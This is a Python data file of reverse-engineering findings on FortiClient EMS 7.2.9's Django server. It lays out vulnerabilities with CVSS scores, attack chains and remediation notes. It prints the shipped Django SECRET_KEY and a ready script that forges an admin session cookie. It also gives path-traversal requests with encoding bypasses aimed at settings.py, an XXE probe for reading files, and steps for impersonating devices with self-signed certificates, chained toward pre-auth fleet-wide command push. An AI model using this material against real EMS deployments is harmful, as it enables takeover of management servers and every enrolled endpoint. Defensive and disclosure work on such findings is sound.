"""
FortiClient EMS 7.2.9 -- Django application RE
Source: FortiClientEMS_7.2.9.0981.exe (WiX Burn bootstrapper)
Extraction: CAB at offset 0x7D600 -> MSI a11 (491MB) -> msiextract -> /tmp/ems_contents/
Django app: Program Files/Fortinet/FortiClientEMS/Fcm/
Python: 3.10 (pyc magic 0x6f0d = 3439), compiled 2025-04-08
Build path: C:\\GitLab-Runner\\builds\\temp\\FortiClientEMS\\webserver\\fcm\\
"""

# ---------------------------------------------------------
# Platform identity
# ---------------------------------------------------------
PLATFORM = {
    "product":    "Fortinet FortiClient EMS",
    "version":    "7.2.9.0981",
    "build_date": "2025-04-08",
    "installer":  "FortiClientEMS_7.2.9.0981.exe (WiX Burn bootstrapper)",
    "stack": {
        "web_server": "Apache24",
        "wsgi":       "Django 4.1 (apache_django_wsgi.conf)",
        "python":     "3.10 (CPython, Windows x64)",
        "db":         "SQL Server (pyodbc)",
        "cache":      "Redis",
    },
    "layout": {
        "installdir": "C:\\Program Files\\Fortinet\\FortiClientEMS",
        "fcm_dir":    "Fcm/",
        "settings":   "Fcm/fcm/settings.py",
        "urls":       "Fcm/fcm/urls.pyc",
        "views":      "Fcm/fcm/views.pyc",
        "auth":       "Fcm/fcm/auth/session_auth.pyc, jwt_auth.pyc, cert_chain_auth.pyc",
    },
    "analysis_notes": [
        "pyc files compiled for Python 3.10; decompyle3 v3.9.3 unsupported -- used strings(1) for constant extraction",
        "settings.py ships in plaintext (not compiled); full source readable from extracted MSI",
        "URL surface recovered from urls.pyc via strings extraction of regex patterns",
    ],
}


# ---------------------------------------------------------
# EMS-F1: Hardcoded Django SECRET_KEY + signed-cookie session forgery
# ---------------------------------------------------------
EMS_F1_SECRET_KEY_AUTH_BYPASS = {
    "id":        "EMS-F1",
    "title":     "Hardcoded Django SECRET_KEY enables pre-auth admin session forgery",
    "severity":  "CRITICAL",
    "cvss":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 9.8,
    "cwe":       "CWE-798 (Use of Hard-coded Credentials)",
    "status":    "CONFIRMED -- key present in shipped settings.py; installer rewrite unconfirmed",

    "evidence": {
        "file":          "Fcm/fcm/settings.py:26",
        "session_engine": "django.contrib.sessions.backends.signed_cookies",
        "secret_key":    "69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r",
        "installer_comment": "# installer rewrites this lines to make it random per-machine",
        "rewrite_status": "No Python rewrite script found in extracted MSI; rewrite is likely a WiX C# custom action (DLL not recoverable from msiextract)",
        "additional_weaknesses": [
            "DEBUG = True",
            "SESSION_COOKIE_HTTPONLY = False -- cookie accessible via JS",
            "SESSION_COOKIE_SECURE = False -- cookie sent over plaintext HTTP",
            "CSRF_COOKIE_SECURE = False",
            "django.contrib.auth commented out of INSTALLED_APPS",
            "django.contrib.auth.middleware.AuthenticationMiddleware commented out of MIDDLEWARE",
        ],
    },

    "mechanism": (
        "Django signed_cookies session engine serializes the entire session dict, "
        "HMAC-signs it with SECRET_KEY (using HMAC-SHA256 via TimestampSigner), "
        "and stores the result client-side in the session cookie. No server-side "
        "session store is consulted. Any party knowing SECRET_KEY can call "
        "django.core.signing.dumps({'user_id': 1, 'user_role': 'admin', 'is_global': True, ...}, "
        "key=SECRET_KEY, salt='django.contrib.sessions.backends.signed_cookies') "
        "and produce a valid session cookie that SessionAuth.check_session accepts."
    ),

    "attack_chain": [
        "Step 1: Obtain SECRET_KEY from shipped installer (default: '69v=0kt6...')",
        "Step 2: Forge session dict with target user_id=1 (superadmin), user_role='admin', is_global=True",
        "Step 3: Sign using django.core.signing.dumps with extracted key",
        "Step 4: Send request to any authenticated /api/v1/ endpoint with forged sessionid cookie",
        "Step 5: SessionAuth.check_session validates HMAC -- passes",
        "Step 6: Full admin API access: device quarantine, policy push, config export, user management",
    ],

    "forge_primitive": """
from django.core.signing import dumps, TimestampSigner
import django.conf
django.conf.settings.configure(
    SECRET_KEY='69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r',
    SESSION_ENGINE='django.contrib.sessions.backends.signed_cookies',
)
session_data = {
    '_auth_user_id': '1',
    '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
    'user_id': 1,
    'user_role': 'admin',
    'is_global': True,
    'vdom': 'root',
    'allowed_vdoms': ['root'],
    'read_only': False,
}
cookie_val = dumps(
    session_data,
    key='69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r',
    salt='django.contrib.sessions.backends.signed_cookies',
    compress=True,
)
# POST to /api/v1/endpoints/ with Cookie: sessionid=<cookie_val>
""",

    "confidence_notes": [
        "Default key confirmed in shipped settings.py",
        "Installer claims to randomize key at install time via custom action (WiX DLL)",
        "If installer rewrite succeeds: key is unique per install; attack requires key recovery",
        "Key recovery vectors: read settings.py from filesystem (requires local access), "
        "backup exposure, Django DEBUG=True error page leaks, LFI via EMS-F2",
        "Even with unique key: key stored in plaintext settings.py readable by any "
        "Windows user with access to the EMS install directory",
        "SESSION_COOKIE_HTTPONLY = False: XSS-to-session-theft enabled even without key",
    ],

    "remediation": [
        "Replace signed_cookies session engine with database-backed sessions (SESSION_ENGINE = 'django.contrib.sessions.backends.db')",
        "Ensure installer randomizes SECRET_KEY and verify the action runs",
        "Set SESSION_COOKIE_HTTPONLY = True",
        "Set SESSION_COOKIE_SECURE = True",
        "Restrict settings.py filesystem permissions to EMS service account only",
        "Disable DEBUG in production builds",
    ],
}


# ---------------------------------------------------------
# EMS-F2: Path traversal via /content/<path> endpoint
# ---------------------------------------------------------
EMS_F2_CONTENT_PATH_TRAVERSAL = {
    "id":       "EMS-F2",
    "title":    "Path traversal in content endpoint allows file read beyond CONTENT_DIRECTORY",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe":      "CWE-22 (Path Traversal)",
    "status":   "CANDIDATE -- regex confirmed; server-side join+sanitize not confirmed",

    "evidence": {
        "url_pattern":   r"^content/(?P<path>[^\\\s]+)/?$",
        "handler":       "views.py View.content()",
        "base_constant": "CONTENT_DIRECTORY (value not recovered; likely relative to INSTALLDIR or BASE_DIR)",
        "regex_analysis": (
            r"Regex [^\\\s]+ excludes only backslash and whitespace. "
            "Forward slashes, dots, and colons are permitted. "
            r"Pattern matches: '../../../Windows/System32/drivers/etc/hosts', "
            r"'../fcm/settings.py', '../../logs/debug_2025-04-08.log'"
        ),
    },

    "auth_status": (
        "CONFIRMED PRE-AUTH -- url group analysis from urls.pyc binary shows content/ "
        "pattern is in the same URL group as signin/ and favicon.ico (both pre-auth), "
        "BEFORE the authenticated API routes. content/ serves localization JS files "
        "needed on the login page before a session exists. No @prepare_api decorator."
    ),

    "content_directory": {
        "value":    "C:\\Program Files\\Fortinet\\FortiClientEMS\\Fcm\\fcm\\static\\js\\localization\\",
        "evidence": "localization_files_util.pyc strings: LOCALIZATION_FOLDER_PATH, static/js/localization/",
        "depth":    3,  # levels up from localization/ to fcm/ where settings.py lives
    },

    "traversal_notes": {
        "apache_normalization": (
            "EMS runs Apache24 as the web server (apache_django_wsgi.conf). "
            "Apache normalizes literal ../ in URL paths before WSGI dispatch, "
            "which may block direct path traversal. However: "
            "(1) URL-encoded variants (%2e%2e%2f) may pass if AllowEncodedSlashes is On; "
            "(2) Windows-specific path parsing may differ; "
            "(3) If Django receives the raw path without Apache normalization, traversal works directly."
        ),
        "bypass_candidates": [
            "GET /content/%2e%2e%2f%2e%2e%2f%2e%2e%2fsettings.py (encoded slashes)",
            "GET /content/..%2fsettings.py (mixed encoding)",
            "GET /content/%252e%252e%252fsettings.py (double encoding)",
        ],
    },

    "attack_chain": [
        "Step 1: GET /content/../../../settings.py (or encoded variant)",
        "Step 2: Read SECRET_KEY from response (live installed key if installer changed it, or default)",
        "Step 3: Forge admin session cookie using recovered key (EMS-F1 primitive)",
        "Step 4: Full admin API access with forged session",
    ],

    "samples": [
        "GET /content/../../../settings.py",
        "GET /content/%2e%2e%2f%2e%2e%2f%2e%2e%2fsettings.py",
        "GET /content/../../../logs/api_2025-04-08.log",
        "GET /content/../../../models/utils/sql_helper.pyc",
    ],

    "remediation": [
        "Resolve path with os.path.abspath() and assert result starts with CONTENT_DIRECTORY",
        "Use Django's serve() with document_root and ensure path is sanitized before join",
    ],
}


# ---------------------------------------------------------
# EMS-F3: XML import/convert endpoints -- XXE candidate
# ---------------------------------------------------------
EMS_F3_XML_XXE_CANDIDATE = {
    "id":       "EMS-F3",
    "title":    "XML import and convert endpoints are candidates for XXE injection",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe":      "CWE-611 (Improper Restriction of XML External Entity Reference)",
    "status":   "CANDIDATE -- endpoints confirmed in URL surface; parser config not confirmed",

    "endpoints": [
        "^convert/xml/?$",
        "^import/xml/?$",
        "^generate/xml/?$",
        "^download/xml/?$",
        "^get/xml/?$",
        "^default_xml/?$",
    ],

    "rationale": (
        "EMS stores endpoint policies and configurations as XML. "
        "Multiple endpoints accept XML uploads (import/xml) and perform XML conversion (convert/xml). "
        "Django does not configure XML parsers by default; if the controller uses Python's "
        "xml.etree.ElementTree or lxml with default settings, external entities are not disabled. "
        "Successful XXE on an import endpoint would allow reading arbitrary files "
        "from the EMS server filesystem via the SYSTEM entity mechanism."
    ),

    "probe": """
POST /api/v1/import/xml/ HTTP/1.1
Cookie: sessionid=<forged_via_EMS-F1>
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///C:/Program Files/Fortinet/FortiClientEMS/Fcm/fcm/settings.py" >]>
<config><item>&xxe;</item></config>
""",

    "remediation": [
        "Parse XML with defusedxml library or set ElementTree.XMLParser to disallow entities",
        "If using lxml: set resolve_entities=False and no_network=True in XMLParser",
    ],
}


# ---------------------------------------------------------
# EMS-F4: URL attack surface -- high-value endpoints
# ---------------------------------------------------------
EMS_F4_ATTACK_SURFACE = {
    "id":    "EMS-F4",
    "title": "FortiClient EMS 7.2.9 full URL attack surface",

    "extraction_method": "strings(1) on urls.pyc -- regex constants recovered without decompilation",

    "high_value_endpoints": {
        "session_forgery_targets": [
            "/api/v1/endpoints/ -- full endpoint management (quarantine, policy, deregister)",
            "/api/v1/users/ -- user management",
            "/api/v1/admins/ -- admin account management",
            "/api/v1/credentials/update/ -- credential update",
            "/api/v1/certificates/ -- certificate management",
            "/api/v1/server_certificates/ -- server cert management",
            "/api/v1/system/ -- system config",
            "/api/v1/settings/ -- application settings",
        ],
        "command_execution_candidates": [
            "/api/v1/groups/<group_id>/send_command/<command> -- pushes commands to enrolled FortiClient agents",
            "/api/v1/send_command/<command> -- global command push",
            "/api/v1/endpoints/<id>/reset_deployment/ -- confirmed in strings: 'Reset deployment of endpoint'",
        ],
        "file_operation_endpoints": [
            "/content/<path> -- EMS-F2 traversal target",
            "/api/v1/upload/ -- file upload",
            "/api/v1/upload_cert/ -- cert upload",
            "/api/v1/upload_pem -- PEM upload",
            "/api/v1/upload_pkcs12 -- PKCS12 upload",
            "/api/v1/download/ -- file download",
            "/api/v1/download_key/ -- key download",
            "/api/v1/export/ -- data export",
            "/api/v1/diagnostic_log/ -- server diagnostic log access",
            "/api/v1/support_package/ -- support package (likely includes config + logs + secrets)",
        ],
        "xml_endpoints": [
            "/api/v1/import/xml/ -- EMS-F3 XXE target",
            "/api/v1/convert/xml/ -- EMS-F3 XXE target",
            "/api/v1/generate/xml/",
            "/api/v1/download/xml/",
        ],
        "auth_bypass_candidates": [
            "/api/v1/jwt/signin/ -- JWT-based signin (separate auth path from session)",
            "/api/v1/auth_fos/ -- FortiOS auth integration",
            "/api/v1/fabric-authorization/ -- fabric device auth (separate path)",
            "/api/v1/saml/ -- SAML auth flow",
            "/api/v1/cloud/signin -- cloud signin flow",
        ],
        "pre_auth_exposed": [
            "/signin/ -- login page",
            "/favicon.ico",
            "/api/v1/check_session -- session validity check (unauthenticated probe)",
            "/api/v1/init_consts -- application constants (may leak version/config info)",
            "/api/v1/acme/ -- ACME certificate management (may be pre-auth)",
        ],
    },

    "total_url_patterns_recovered": "~200+ unique regex patterns",

    "send_command_analysis": {
        "url": r"^groups/(?P<group_id>\d+)/send_command/(?P<command>",
        "note": (
            "command parameter is URL-captured; in endpoint_controller.pyc strings, "
            "ENDPOINT_COMMANDS is referenced alongside 'quarantined', 'vulnscan' constants -- "
            "commands appear to be validated against an allowlist before dispatch to FortiClient agents. "
            "Command injection on the EMS server itself was NOT confirmed; "
            "these commands are pushed to enrolled endpoints via the OFTP/EMS protocol, not executed locally."
        ),
        "lateral_risk": (
            "Authenticated admin can push quarantine/vulnscan/remediation commands to all enrolled "
            "FortiClient endpoints. Combined with EMS-F1, an unauthenticated attacker gains "
            "fleet-wide endpoint command execution capability."
        ),
    },
}


# ---------------------------------------------------------
# EMS-F5: Embedded shared Fortinet root CA in FcmDaemon.exe
# ---------------------------------------------------------
EMS_F5_EMBEDDED_CA = {
    "id":       "EMS-F5",
    "title":    "Shared Fortinet root CA embedded in FcmDaemon.exe with encrypted private key",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
    "cwe":      "CWE-321 (Use of Hard-coded Cryptographic Key)",
    "status":   "CONFIRMED -- CA cert embedded; passphrase at runtime (not hardcoded); impact depends on passphrase recovery",

    "certificate": {
        "issuer":    "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=Certificate Authority, CN=support",
        "subject":   "Same (self-signed)",
        "email":     "support@fortinet.com",
        "not_before": "2015-07-16 22:34:39 UTC",
        "not_after":  "2038-01-19 22:34:39 UTC",
        "key_usage":  "CA:TRUE (can sign any certificate)",
        "key_size":   "RSA 2048-bit",
    },

    "private_key": {
        "format":     "PEM PKCS#1 RSA private key, AES-256-CBC encrypted",
        "iv":         "F4DD69DDD1982F6FDD0D75097603C628",
        "location":   "FcmDaemon.exe binary (embedded as string constant)",
        "passphrase": "Runtime CLI argument --keypass; NOT hardcoded in binary or config files",
    },

    "impact": (
        "Fortinet CA cert is shared across ALL EMS installations -- it is embedded in the installer binary. "
        "Apache VirtualHost references SSLCACertificateFile 'fortinet_ca_root_all.crt' for client cert validation. "
        "If private key passphrase is recovered (registry, process memory, installer custom action analysis), "
        "attacker can sign arbitrary client certs trusted by ALL EMS instances. "
        "Combined with EMS-F6 (optional_no_ca), cert forgery is not needed for the web API -- "
        "but matters for OFTP/gRPC agent channel (FcmDaemon port 8013)."
    ),

    "attack_chain": [
        "Step 1: Recover --keypass from EMS service registry or installer custom action DLL",
        "Step 2: Decrypt embedded RSA private key using openssl pkey -in key.pem -passin pass:<keypass>",
        "Step 3: Sign client cert with CN=<FortiGate serial number> or CN=<admin username>",
        "Step 4: Use signed cert to impersonate FortiGate device in fabric auth or EMS agent protocol",
    ],
}


# ---------------------------------------------------------
# EMS-F6: Apache SSLVerifyClient optional_no_ca -- arbitrary client cert accepted
# ---------------------------------------------------------
EMS_F6_CLIENT_CERT_NO_CA_VERIFY = {
    "id":       "EMS-F6",
    "title":    "Apache SSLVerifyClient optional_no_ca allows arbitrary client certs to bypass identity verification",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe":      "CWE-295 (Improper Certificate Validation)",
    "status":   "CONFIRMED -- config explicitly sets optional_no_ca",

    "evidence": {
        "file":    "Apache24/conf/apache_django_wsgi.conf (VirtualHost *:[SERVERSSLPORT])",
        "config":  "SSLVerifyClient optional_no_ca",
        "header_forwarding": "RequestHeader set SSL_CLIENT_S_DN_CN \"%{SSL_CLIENT_S_DN_CN}s\"",
        "explanation": (
            "optional_no_ca means: accept client certificate if presented, "
            "but DO NOT verify it against any CA. Any self-signed certificate is accepted. "
            "The client cert's CN is extracted and forwarded to Django as SSL_CLIENT_S_DN_CN request header."
        ),
    },

    "attack_chain": [
        "Step 1: Generate self-signed certificate with any desired CN (e.g., 'admin', a FortiGate serial number)",
        "Step 2: Connect to EMS HTTPS (port 8443 or SERVERSSLPORT) with the self-signed cert",
        "Step 3: Apache accepts the cert (no CA check) and sets SSL_CLIENT_S_DN_CN = <your CN>",
        "Step 4: Django cert_chain_auth.pyc receives forged CN as trusted identity",
        "Step 5: Impact depends on how Django uses SSL_CLIENT_S_DN_CN for access control",
    ],

    "affected_auth_paths": [
        "cert_chain_auth.pyc -- device identity from cert CN for fabric authorization",
        "fabric_device_auth_controller.pyc -- FortiGate fabric device endpoints",
        "fct_saml_auth_controller.pyc -- SAML with cert-chain identity",
        "^fabric-authorization/ -- fabric auth endpoint",
        "^fabric_device_auth/ -- device auth endpoint",
    ],

    "note": (
        "SSLVerifyClient optional_no_ca is different from optional: "
        "'optional' validates cert against SSLCACertificateFile; "
        "'optional_no_ca' skips all chain validation. "
        "The auth impact requires cert_chain_auth.pyc analysis to confirm scope -- "
        "Django may add additional validation beyond the CN check."
    ),

    "apache_config_other_findings": {
        "script_src_unsafe_eval": (
            "Content-Security-Policy allows 'unsafe-eval' and 'unsafe-inline' in script-src -- "
            "XSS mitigation weakened; JS eval() allowed."
        ),
        "proxy_to_ztnaworker": (
            "SSL_CLIENT_VERIFY SUCCESS routes /api/v1/report/fct/tags -> localhost:9990 -- "
            "with forged cert (EMS-F6), attacker routes to ztnaworker directly."
        ),
    },
}


# ---------------------------------------------------------
# EMS-F7: GoEMS/FcmDaemon architecture findings
# ---------------------------------------------------------
EMS_F7_DAEMON_ARCHITECTURE = {
    "id":    "EMS-F7",
    "title": "GoEMS daemon architecture -- ECSO gRPC port 8013, Redis no-auth",
    "severity": "MEDIUM",

    "daemon_stack": {
        "goEMS.conf": "Go-based EMS daemon handling agent protocol (gRPC)",
        "ecsocksrvworker": {
            "host": "0.0.0.0",
            "port": 8013,
            "tls":  "yes (TLS_ECDHE_ECDSA ciphers)",
            "protocols": ["X-FCCK-PROBE", "X-FCCK-TAG", "X-FCCK-REGISTER", "X-FCCK-KA"],
        },
        "legacy_protocol": {
            "host": "127.0.0.1",
            "port": 65431,
            "services": ["X-FCCK-PROBE", "X-FCCK-REGISTER", "X-FCCK-KA", "X-FCCK-TAG", "UPLOAD"],
        },
        "workers": {
            "kaworker":   {"port": 9991, "grpc": True},
            "probeworker": {"port": 9992},
            "tagworker":  {"port": 9993},
            "regworker":  {"port": 9994, "grpc": True},
            "ztnaworker": {"port": 9990},
            "das":        {"port": 65432},
        },
    },

    "redis_no_auth": {
        "host":     "127.0.0.1",
        "port":     6379,
        "password": "",
        "evidence": "connector.conf [redis] Password = (empty)",
        "impact":   (
            "Redis accessible without authentication from any process on EMS server. "
            "Post-initial-access: read/write session data, push malicious tasks, "
            "inject data into EMS workflow queues."
        ),
    },

    "pre_auth_surface": (
        "Port 8013 is the pre-authentication FortiClient agent registration endpoint. "
        "X-FCCK-REGISTER service accepts agent connections without prior authentication. "
        "Analysis of regworker.exe (Go binary, 14 sections) is needed to identify "
        "registration protocol parsing vulnerabilities."
    ),
}


# ---------------------------------------------------------
# Pending analysis
# ---------------------------------------------------------
PENDING = [
    "EMS-F2 revision: Apache Alias /static/ serves fcm/fcm/static/ directly -- "
    "Django content/<path> serves a DIFFERENT directory; CONTENT_DIRECTORY value unconfirmed; "
    "ContentDict in views.py may be a whitelist (not traversal-vulnerable); needs binary analysis",
    "EMS-F6: Analyze cert_chain_auth.pyc to confirm what SSL_CLIENT_S_DN_CN is used for and impact scope",
    "EMS-F5: Recover --keypass from EMS Windows service registry or installer custom action DLL",
    "EMS-F3: Confirm XML parser -- check if defusedxml is installed in Python path",
    "regworker.exe (Go binary, port 9994): analyze gRPC service definitions for X-FCCK-REGISTER protocol vulns",
    "Port 8013 pre-auth surface: analyze goEMS binary for ECSO protocol parsing vulnerabilities",
    "Check /api/v1/support_package/ for credential/key inclusion in archive",
    "Check if /api/v1/init_consts is unauthenticated and leaks version/build info",
    "FortiClient VPN 7.2.10 -- start extraction and RE",
    "FAZ VM64 -- pending flatkc key for encrypted rootfs",
    "FortiGate VM64 -- pending flatkc key",
]
